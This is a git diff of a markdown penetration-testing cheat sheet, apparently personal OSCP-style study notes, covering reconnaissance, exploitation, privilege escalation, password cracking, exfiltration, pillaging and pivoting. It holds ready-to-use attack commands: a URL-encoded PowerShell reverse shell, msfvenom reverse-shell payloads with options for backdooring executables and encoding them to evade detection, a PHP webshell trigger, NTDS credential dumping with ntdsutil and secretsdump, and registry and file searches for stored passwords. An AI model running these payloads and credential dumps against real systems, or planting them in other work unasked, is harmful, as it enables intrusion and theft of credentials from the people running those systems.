@@ -2,80 +2,103 @@
 
 ## Table of Contents
 
-**1. [Other Cheatsheets/Libraries](#1-other-cheatsheetslibraries)**
-
-**2. [General Tools](#2-general-tools)**
+**1. [General](#1-general)**
 
 * [Tools](#tools)
+* [Cheatsheets](#cheatsheets)
 * [Wordlists](#wordlists)
 
-**3. [Information Gathering](#3-information-gathering)**
+**2. [Information Gathering](#2-information-gathering)**
 
 * [useful links](#useful-links)
-* [Tools](#tools-1)
-* [Nmap](#nmap)
+* [Passive](#passive)
+    * [OSINT](#osint)
+* [Active](#active)
+* [Others & Combined](#others--combined)
+    * [Nmap](#nmap)
+* [Other Tipps](#other-tipps)
 
-**4. [Vulnerability Scanner](#4-vulnerability-scanner)**
+**3. [Vulnerability Scanner](#3-vulnerability-scanner)**
 
 * [Databases](#databases)
 
-**5. [Exploitation](#5-exploitation)**
+**4. [Exploitation](#4-exploitation)**
 
-* [Reverse Shell useful links](#reverse-shells-useful-links)
+* [Reverse Shell useful links](#reverse-shells-useful-links--others)
+* [sqlmap](#sqlmap)
 * [Netcat](#netcat)
 * [Socat](#socat)
+* [Metasploit](#metasploit)
 * [Msfvenom](#msfvenom)
 * [Powershell one-liner](#powershell-one-liner)
 * [PHP Webshell one-liner](#php-webshell-one-liner)
 
-**6. [Linux Privilege Escalation](#6-linux-privilege-escalation)**
+**5. [Linux Privilege Escalation](#5-linux-privilege-escalation)**
 
-**7. [Windows Privilege Escalation](#7-windows-privilege-escalation)**
+**6. [Windows Privilege Escalation](#6-windows-privilege-escalation)**
 
-**8. [Password/Hash Cracking](#8-passwordhash-cracking)**
+**7. [Password/Hash Cracking](#7-passwordhash-cracking)**
 
 * [useful links](#useful-links-1)
 * [Hashcat](#hashcat)
 * [John the Ripper](#john-the-ripper)
 * [Hydra](#hydra)
 
-**9. [Exfiltration](#9-exfiltration)**
+**8. [Exfiltration](#8-exfiltration)**
 
 * [Server](#server)
-* [Upload](#upload)
-* [Download](#download)
 
-**10. [Persistence](#10-persistence)**
+**9. [Persistence](#9-persistence)**
 
-**11. [Cleanup](#11-cleanup)**
+* [Windows](#windows)
+* [Linux](#linux)
 
+**10. [Pillaging](#10-pillaging)**
 
-## 1. Other Cheatsheets/Libraries:
+**12. [Pivoting](#11-pivoting)**
+
+* [General](#general)
+* [SSH](#ssh)
+* [Proxychains](#proxychains)
+* [Chisel](#chisel)
+
+## 1. General:
+
+### Tools:
+
+[CyberChef](https://gchq.github.io/CyberChef/)
+
 [Lolbas-Project](https://lolbas-project.github.io/)
-
-[Ivan-Sincek Penetration testing cheat sheet (very detailed)](https://github.com/ivan-sincek/penetration-testing-cheat-sheet)
 
 [GTFOBins](https://gtfobins.github.io/)
 
 [MITRE ATT&CK](https://attack.mitre.org/)
 
-## 2. General Tools:
+### Cheatsheets:
 
-### Tools
+[HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-methodology)
 
-[CyberChef](https://gchq.github.io/CyberChef/)
+[InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings/
+)
+
+[Ivan-Sincek Penetration testing cheat sheet (very detailed)](https://github.com/ivan-sincek/penetration-testing-cheat-sheet)
+
+[Liodeus - OSCP Cheatsheet](https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html#linux-4)
+- port by port procedure
+
+[OSCP Cheatsheet](https://github.com/0xsyr0/OSCP?tab=readme-ov-file)
+
+[Red Team Notes - Pentesting Cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
 
 ### Wordlists:
 
 https://github.com/danielmiessler/SecLists
 
-## 3. Information Gathering:
+## 2. Information Gathering:
 
 ### useful links:
 
 [OWASP favicon Database](https://wiki.owasp.org/index.php/OWASP_favicon_database)
-
-[Shodan](https://www.shodan.io/)
 
 [List of portnumbers with common protocols](https://de.wikipedia.org/wiki/Liste_der_Portnummern)
 
@@ -86,15 +109,101 @@ Default Password Databases:
 * https://datarecovery.com/rd/default-passwords/
 * https://redoracle.com/PasswordDB/vpasp.html
 
-### Tools:
+### Passive:
 
-Content Discovery:
+[Shodan](https://www.shodan.io/)
 
-[Wappanalyzer](https://www.wappalyzer.com/)
+[Smap (Nmap but passive -> same syntax)](https://github.com/s0md3v/Smap)
 
 [Wayback Machine](https://web.archive.org/)
 
-[WPscan](https://wpscan.com/#solutions)
+Pingsweep:
+```bash
+#!/bin/bash
+
+for ip in $(seq 0 250) ; do
+#echo <>.<>.<>.$ip
+ping -c 1 <>.<>.<>.$ip |grep "bytes from" |cut -d" " -f 4 |cut -d ":" -f 1 &
+done
+```
+Domain Enumeration:
+
+`whois <domain_name>`
+```
+nslookup <domain_name> <dns_server(local/public)(optional)>
+    -type 
+        A       IPv4 Addresses
+        AAAA    IPv6 Addresses
+        CNAME   Canonical Name
+        MX      Mail Servers
+        SOA     Start of Authority
+        TXT     TXT Records
+```
+Subdomain Enumeration:
+
+[DNSdumpster](https://dnsdumpster.com/)
+
+[Sublist3r](https://github.com/aboul3la/Sublist3r)
+```
+./sublist3r.py -d <domain>
+```
+SSL/TLS Certificates etc.:
+
+https://crt.sh/
+
+https://ui.ctsearch.entrust.com/ui/ctsearchui
+
+[SSL Server Test](https://www.ssllabs.com/ssltest/)
+        
+-> detailed information about certificate, configuration(protocols, cipher suites, protocol handshake)
+
+#### OSINT:
+
+[OSINT-Framework](https://github.com/Ignitetechnologies/Mindmap/blob/main/OSINT/OSINT%20Framework.pdf)
+
+[awesome-osint](https://github.com/jivoi/awesome-osint)
+
+-> overview of every OSINT topic with tools/websites
+
+[SpiderFoot - OSINT Automation Tool](https://github.com/smicallef/spiderfoot)
+
+[Social Searcher](https://www.social-searcher.com/)
+
+[Security Headers](https://securityheaders.com/)
+
+[Wappanalyzer](https://www.wappalyzer.com/)
+
+[WPscan - Website](https://wpscan.com/#solutions)
+
+[Sherlock - "Hunt down social media accounts by username across social networks"](https://github.com/sherlock-project/sherlock)
+
+
+recon-ng:
+- modules have to be installed over a marketplace
+- search: `marketplace search <name ex. Github>`
+- info: `marketplace info <modulename>`
+- install: `marketplace install <modulename>`
+- load: `marketplace load <modulename>`
+    - via `info` options are shown
+    - `option set <options>`
+- `run` for running module
+- `back` for leaving module
+
+[theHarvester](https://github.com/laramies/theHarvester)
+-d target-domain
+-b data source for search (ex. google)
+-e specification for dns server
+
+
+#### Google Dorking:
+
+-> [use the google advanced search](https://www.google.com/advanced_search)
+
+[dorksearch](https://dorksearch.com/)
+
+[Google Hacking Database (Exploit Database)](https://www.exploit-db.com/google-hacking-database)
+
+### Active:
 
 #### ffuf:
 ```
@@ -109,49 +218,24 @@ dirb <url> /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 gobuster dir --url <url> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt   
 ```
 
-SSL/TLS Certificates:
+#### wpscan:
 
-https://crt.sh/
+`wpscan --url <url> --plugins-detection aggressive`
 
-https://ui.ctsearch.entrust.com/ui/ctsearchui
-
-
-DNS Bruteforce: 
-```
-dnsrecon   
-```
 Domain Enumeration:
-
-`whois <domain_name>`
-
-```
-nslookup <domain_name> <dns_server(local/public)(optional)>
-    -type 
-        A       IPv4 Addresses
-        AAAA    IPv6 Addresses
-        CNAME   Canonical Name
-        MX      Mail Servers
-        SOA     Start of Authority
-        TXT     TXT Records
-```
 ```
 dig @<server> <domain_name> <type>
     server -> optional
     type -> see nslookup
 ```
 
+### Others & Combined:
 
-Subdomain Enumeration:
-
-[DNSdumpster](https://dnsdumpster.com/)
-
-[Sublist3r](https://github.com/aboul3la/Sublist3r)
+DNS enumeration: 
 ```
-./sublist3r.py -d <domain>
+dnsrecon -d <domain> [options]  
 ```
-
-
-### Nmap:
+#### Nmap:
 ```
 nmap <scan_type> <options> <machine_ip/network>
 
@@ -231,7 +315,7 @@ nmap <scan_type> <options> <machine_ip/network>
 * change `etc/hosts` if domain is not available/gets redirected
 * Banner Grabbing with nc `nc -vn <ip> <port>`
 
-## 4. Vulnerability Scanner:
+## 3. Vulnerability Scanner:
 
 [Nessus Essential Download](https://community.tenable.com/s/article/Nessus-Essentials?language=en_US)
 
@@ -245,9 +329,9 @@ nmap <scan_type> <options> <machine_ip/network>
 
 [Rapid7](https://www.rapid7.com/db/)
 
-## 5. Exploitation:
+## 4. Exploitation:
 
-### Reverse Shells useful links:
+### Reverse Shells useful links & Others:
 https://github.com/martinsohn/PowerShell-reverse-shell
 
 https://www.revshells.com/
@@ -255,6 +339,16 @@ https://www.revshells.com/
 https://github.com/samratashok/nishang/tree/master
 
 [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+[Introduction to writing shell code](https://www.exploit-db.com/papers/13224)
+
+[Ciphey](https://github.com/Ciphey/Ciphey)
+
+### sqlmap:
+
+`sqlmap -u <target-URL>`
+
+https://medium.com/@cuncis/the-ultimate-sqlmap-tutorial-master-sql-injection-and-vulnerability-assessment-4babdc978e7d
 
 ### Netcat:
 Reverse Shell:
@@ -354,8 +448,11 @@ Example for Windows
 
     A: socat OPENSSL:<target_ip>:<port_number>,verify=0 -
 ```
+### Metasploit:
 
-### Msfvenom:
+![Metasploit](images/Metasploit.png)
+
+### [Msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/):
 
 use `exploit/multi/handler` to catch rev-shells
 
@@ -395,6 +492,17 @@ msfvenom -p cmd/unix/reverse_python LHOST=<attack_ip> LPORT=<port_number> -f raw
 
 msfvenom -p python/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f raw > rev_shell.py
 ```
+other usecases:
+```
+add msfvenom shell into an executable
+    add options:
+        -x <path_to_exe>
+        -k
+
+obfuscation:
+    add option(example with "Shikata Ga Nai"):
+        -e x86/shikata_ga_nai
+```
 ### Powershell one-liner:
 ````powershell
 powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.
@@ -411,7 +519,7 @@ powershell -c “$client = New-Object System.Net.Sockets.TCPClient(‘<ip>’,<p
 
 need to trigger rev-shell -> find upload folder -> add to url-path `http://<ip>/<path>/php_shell.php?cmd=<rev_shell>`
 
-## 6. Linux Privilege Escalation:
+## 5. Linux Privilege Escalation:
 
 ### useful links:
 
@@ -561,7 +669,7 @@ A:  mkdir /tmp/<directory>
 T:  execute
 ```
 
-## 7. Windows Privilege Escalation:
+## 6. Windows Privilege Escalation:
 
 ### useful Links:
 
@@ -584,8 +692,7 @@ T:  execute
 
     We need to bypass Execution Policy in order to run this tool.
 
-    ```
-    Powershell:
+    ```powershell
         Set-ExecutionPolicy Bypass -Scope process -Force
         . .\PrivescCheck.ps1
         Invoke-PrivescCheck
@@ -664,7 +771,7 @@ After fake RogueWinRM service is running:
 
 `wmic product get name,version,vendor`
 
-## 8. Password/Hash Cracking:
+## 7. Password/Hash Cracking:
 
 ### useful links:
 
@@ -672,22 +779,58 @@ https://crackstation.net/
 
 [Hash-identifier](https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py)
 
-### Hashcat:
+[RegEx expressions & bash scripts for PW cracking](https://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers)
+
+### [Hashcat](https://hashcat.net/wiki/):
+
+```
+hashcat [options] <hash_file> <wordlist>
+
+options:
+    -m                  hash-type
+            https://hashcat.net/wiki/doku.php?id=example_hashes
+    -a                  attack-mode
+            0   Straight
+            1   Combination
+            3   Brute Force
+            6   Hybrid Wordlist + Mask
+            7   Hybrid Wordlist + Wordlist
+            9   Assosiation
+            
+    --force             ignore warnings
+    --runtime           abort session after X seconds of runtime
+    --status            enable automatic update of the status screen
+    -o                  define outfile for recovered hash
+    --show              show cracked passwords found in potfile
+    --session           define specific session name exp.:--session=session1
+    --restore           restore session from --session
+    --restore-file-path specific path to restore lenghts
+    -O                  enable optimized kernels
+```
 
 ### John the Ripper:
 https://www.openwall.com/john/
 ````
+automatic: 
+     john --wordlist=<path_to_wordlist> <path_to_file>
+        -> add --format=<hash_format> when known
+            -> for standard hash types like md5 you have to add "raw-" as prefix
+            -> overview of formats: john --list=formats | grep -iF "<>"
 
+unshadow <path_to_passwd> <path_to_shadow>
 
 single crackmode:
+    john --single --format=<format> <path_to_file>
+
 
 custom crack rules:
+    add rules in /etc/john/john.conf
 
-zip-files:  zip2john <zip_file> > <zip_hash>
-
-rar-files:  rar2john <rar_archive> > <rar_hash>
-
-ssh-keys:   ssh2john <>
+Extensions for specific data types:
+    zip-files:  zip2john <zip_file> > <zip_hash>
+    rar-files:  rar2john <rar_archive> > <rar_hash>
+    ssh-keys:   ssh2john <id_rsa private key file> > [output_file]
+    etc.
 
 ````
 
@@ -706,14 +849,80 @@ hydra -l <username> -P <wordlist.txt> <server> <service>
         -t <number>         specify number of parallel connections (e.g. -t 16)
 ````
 
-## 9. Exfiltration:
+## 8. Exfiltration:
 
 ### Server:
 
-### Upload:
+SCP:
+```
+copy a file from local to remote server: scp <local_file_path> <username>@<ip>:<save_to_file_path>
 
-### Download:
+copy file from remote server to local host: scp <ip>:<remote_file_path> <local_save_path>
 
-## 10. Persistence:
+copy directory: scp -r <directory> <username>@<ip>:<path_to_remote_directory>
+```
+## 9. Persistence:
 
-## 11. Cleanup:
+### Windows:
+
+    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md9
+
+### Linux: 
+
+    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
+
+## 10. Pillaging:
+
+[evil-winrm](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)
+
+`reg query HKLM /f password /t REG_SZ /s`
+
+`findstr /si password *.xml *.ini *.txt`
+
+`ntdsutil "ac in ntds" "ifm" "cr fu c:\temp" q q`
+
+-> create full backup from NTDS-database and saves it in c:\temp
+
+`secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit -outputfile <>`
+
+## 11. Pivoting:
+
+### General:
+1. https://github.com/t3l3machus/pentest-pivoting
+2. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md#network-pivoting-techniques
+3. https://cocomelonc.github.io/pentest/2021/11/04/pivoting-1.html
+4. https://cocomelonc.github.io/pentest/2021/11/08/pivoting-2.html
+5. https://www.techtalk.andriejsazanowicz.com/2023/03/25/hide-your-ip-with-a-proxychains-and-tor-network/
+
+### SSH:
+
+bind adress doesn't have to be used all the time
+
+local port forwarding:
+
+`ssh -L [bindddr]:[port]:[dsthost]:[dstport] [user]@[host]`
+
+remote port forwarding:
+
+`ssh -R [bindddr]:[port]:[localhost]:[localport] [user]@[host]`
+
+SOCKS:
+
+`ssh -D 8080 [user]@[host]`
+
+-f  background
+
+-N  do not execute a remote command 
+
+
+### Proxychains:
+
+- `sudo apt-get install proxychains`
+- config file @ /etc/proxychains.conf
+- add proxy server `<server-type(socks5)> <ip> <port>`
+- select proxy type (strict, dynamic,random) by removing # in front of line
+- `proxychains <application> <application_options>`
+
+### Chisel:
+    
+    https://ap3x.github.io/posts/pivoting-with-chisel/
